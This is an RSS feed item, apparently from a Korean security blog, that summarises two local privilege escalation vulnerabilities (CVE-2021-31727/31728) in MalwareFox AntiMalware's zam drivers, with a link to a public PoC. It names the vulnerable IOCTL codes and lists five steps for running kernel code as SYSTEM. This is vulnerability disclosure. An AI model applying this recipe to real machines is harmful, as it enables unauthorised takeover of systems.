-      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://github.com/irql0/CVE-2021-31728">CVE-2021-31728</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>MalwareFox AntiMalware 2.74.0.150</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>안티 멀웨어 소프트웨어인 MalwareFox에서 발견된 로컬 권한 상승 취약점의 세부 정보 및 PoC가 공개되었습니다. 공개된 취약점은 두 가지로, 모두 MalwareFox의 <code>zam64.sys</code> 및 <code>zam32.sys</code> 드라이버에 존재합니다. </p><h3 id="CVE-2021-31727"><a href="#CVE-2021-31727" class="headerlink" title="CVE-2021-31727"></a>CVE-2021-31727</h3><p><code>zam64.sys</code>/<code>zam32.sys</code> 드라이버의 IOCTL <code>0x80002014</code> 및 <code>0x80002018</code> 은 unrestricted disk read/write가 가능합니다. 해커는 이를 악용해 부트 섹터를 덮어쓰거나 메모리 상의 코드를 덮어쓰는 방식으로 권한 상승을 트리거할 수 있습니다.</p><h3 id="CVE-2021-31728"><a href="#CVE-2021-31728" class="headerlink" title="CVE-2021-31728"></a>CVE-2021-31728</h3><p>IOCTL <code>0x80002040</code>은 UserBuffer에서 복사되는 대상 버퍼인 NonPagedPool에서 커널 메모리가 할당되며 입력 버퍼가 <code>0x1000</code> bytes보다 커 쉘코드에 사용될 수 있습니다. IOCTL <code>0x80002018</code> 은 miniport 드라이버의 IRP_MJ_SCSI_HANDLER에 대한 함수를 설정할 수 있으며 사용자 입력에 의해 지정된 드라이버에 SCSI 요청을 보내 이를 이용해 쉘코드를 실행할 수 있습니다.</p><p>위 취약점을 악용하면 아래 방법으로 드라이버 컨텍스트의 ring0 코드를 실행해 시스템 권한으로 프로세스를 실행 가능합니다.</p><ol><li>IOCTL <code>0x80002010</code>으로 <code>\.\ZemanaAntiMalware</code> 에 대한 핸들을 가져옴</li><li>IOCTL <code>0x80002040</code>으로 NonPagedPool에 커널 메모리 할당</li><li><code>SystemBigPoolInformation</code>로 할당된 커널 메모리 검색</li><li>IOCTL <code>0x80002044</code>로 miniport 드라이버 구성</li><li>IOCTL <code>0x80002014</code> 또는 <code>0x80002018</code>로 해커가 정의한 miniport 드라이버 실행</li></ol>]]></content:encoded>
-      
-      
-      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
-      
-      
-      <category domain="https://hackyboiz.github.io/tags/cve/">cve</category>
-      
-      <category domain="https://hackyboiz.github.io/tags/windows/">windows</category>
-      
-      <category domain="https://hackyboiz.github.io/tags/lpe/">lpe</category>
-      
-      <category domain="https://hackyboiz.github.io/tags/L0ch/">L0ch</category>
-      
-      <category domain="https://hackyboiz.github.io/tags/local-privilege-escalation/">local privilege escalation</category>
-      
-      <category domain="https://hackyboiz.github.io/tags/antimalware/">antimalware</category>
-      
-      <category domain="https://hackyboiz.github.io/tags/driver-exploit/">driver exploit</category>
-      
-      
-      <comments>https://hackyboiz.github.io/2021/05/28/l0ch/2021-05-28/#disqus_thread</comments>
       
     </item>
     
